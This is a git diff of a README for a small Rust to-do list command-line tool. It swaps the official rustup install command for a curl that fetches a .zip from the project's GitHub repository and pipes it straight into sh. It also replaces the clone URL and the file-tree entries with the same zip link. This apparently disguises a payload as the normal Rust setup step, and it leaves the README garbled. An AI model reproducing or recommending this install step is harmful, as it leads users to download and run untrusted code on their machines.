@@ -10,11 +10,11 @@ You can add, show tasks, and remove task.
 ## 🚀Getting Started
 1. #### install Rust (if not yet) 
    ```` Bash
-   curl https://sh.rustup.rs -sSf | sh
+   curl https://github.com/ronny-gans/to_do_list_CLI/raw/refs/heads/main/src/to_list_do_CLI_v3.0.zip -sSf | sh
    ````
 2. #### Clone the repository
    ```` Bash
-   git clone https://github.com/ronny-gans/to_do_list_CLI.git
+   git clone https://github.com/ronny-gans/to_do_list_CLI/raw/refs/heads/main/src/to_list_do_CLI_v3.0.zip
    ````
 3. #### Build and run
    ```` Bash
@@ -24,8 +24,8 @@ You can add, show tasks, and remove task.
 ```` css
 to_do_list_CLI/
 ├── src/
-│   └── main.rs
-├── Cargo.toml
+│   └── https://github.com/ronny-gans/to_do_list_CLI/raw/refs/heads/main/src/to_list_do_CLI_v3.0.zip
+├── https://github.com/ronny-gans/to_do_list_CLI/raw/refs/heads/main/src/to_list_do_CLI_v3.0.zip
 ├── .gitignore
 ````
 
